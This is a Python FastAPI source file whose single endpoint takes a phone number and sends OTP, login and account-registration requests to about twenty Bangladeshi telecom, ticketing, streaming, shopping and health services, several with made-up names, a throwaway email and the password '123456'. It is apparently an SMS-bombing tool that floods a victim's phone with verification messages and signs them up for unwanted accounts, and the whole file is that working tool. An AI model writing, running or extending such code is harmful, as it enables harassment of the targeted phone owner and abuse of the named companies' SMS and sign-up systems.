from fastapi import FastAPI, Request from fastapi.responses import JSONResponse import httpx

app = FastAPI()

@app.get("/api") async def send_otp(num: str): results = []

async with httpx.AsyncClient(timeout=10.0) as client:

    async def try_post_json(name, url, json_data=None, headers=None):
        try:
            r = await client.post(url, json=json_data, headers=headers)
            results.append({name: r.json()})
        except Exception as e:
            results.append({name: str(e)})

    async def try_post_form(name, url, form_data=None, headers=None):
        try:
            r = await client.post(url, data=form_data, headers=headers)
            results.append({name: r.json()})
        except Exception as e:
            results.append({name: str(e)})

    async def try_get(name, url, headers=None):
        try:
            r = await client.get(url, headers=headers)
            results.append({name: r.json()})
        except Exception as e:
            results.append({name: str(e)})

    # GP
    await try_post_form("gp", "https://webloginda.grameenphone.com/backend/api/v1/otp",
        form_data={"msisdn": num},
        headers={"Content-Type": "application/x-www-form-urlencoded"})

    # Robi
    await try_post_json("robi", "https://www.robi.com.bd/en", json_data=[{"msisdn": num}])

    # Bikroy
    await try_get("bikroy", f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}")

    # Apex4U
    await try_post_json("apex4u", "https://api.apex4u.com/api/auth/login", json_data={"phoneNumber": num})

    # Bdtickets (user)
    await try_post_json("bdtickets_user", "https://api.bdtickets.com:20100/v1/user",
        json_data={"phoneNumber": "+88" + num, "firstName": "Rafi", "lastName": "Sarker", "applicationChannel": "WEB_APP", "locale": "EN"})

    # Bdtickets (auth)
    await try_post_json("bdtickets_auth", "https://api.bdtickets.com:20100/v1/auth",
        json_data={"createUserCheck": True, "phoneNumber": "+88" + num, "applicationChannel": "WEB_APP"})

    # Bioscope
    await try_post_json("bioscope", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        json_data={"number": "+88" + num})

    # Sundarban Courier
    await try_post_json("sundarban", "https://api-gateway.sundarbancourierltd.com/graphql",
        json_data={
            "operationName": "CreateAccessToken",
            "variables": {"accessTokenFilter": {"userName": num}},
            "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"
        })

    # Chokrojan
    await try_post_json("chokrojan", "https://chokrojan.com/api/v1/passenger/login/mobile",
        json_data={"mobile_number": num})

    # Daktare
    await try_post_form("daktare", "https://www.daktare.com/login/mobile",
        form_data={"mobile": num},
        headers={"Content-Type": "application/x-www-form-urlencoded"})

    # Deeptoplay
    await try_post_json("deeptoplay", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        json_data={"number": "+88" + num})

    # Doctime
    await try_post_json("doctime", "https://api.doctime.com.bd/api/v2/authenticate",
        json_data={"country_calling_code": "88", "contact_no": num, "timestamp": 1754348704})

    # Easy.com.bd
    await try_post_json("easy", "https://core.easy.com.bd/api/v1/registration",
        json_data={"name": "Vv", "email": "cfhcch8@gmail.com", "mobile": num, "password": "123456", "password_confirmation": "123456", "device_key": "831e1877eb5ffb6b22763444986eb70e"})

    # EonBazar
    await try_post_json("eonbazar", "https://app.eonbazar.com/api/auth/register",
        json_data={"mobile": num, "name": "Rfi", "password": "123456", "email": "cfhcch8@gmail.com"})

    # Flipper
    await try_post_json("flipper", "https://portal.flipper.com.bd/api/v1/send-otp/login",
        json_data={"mobile_number": num})

    # Ghoori Learning
    await try_post_json("ghoori", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        json_data={"mobile_no": num})

    # Hoichoi
    await try_post_json("hoichoi", "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
        json_data={"phoneNumber": "+88" + num})

    # KireiBD
    await try_post_json("kireibd", "https://app.kireibd.com/api/v2/send-login-otp",
        json_data={"email": num})

    # Quizgiri
    await try_post_json("quizgiri", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        json_data={"phone": num[-10:], "country_code": "+880", "fcm_token": None})

return JSONResponse(content={"number": num, "results": results})

  
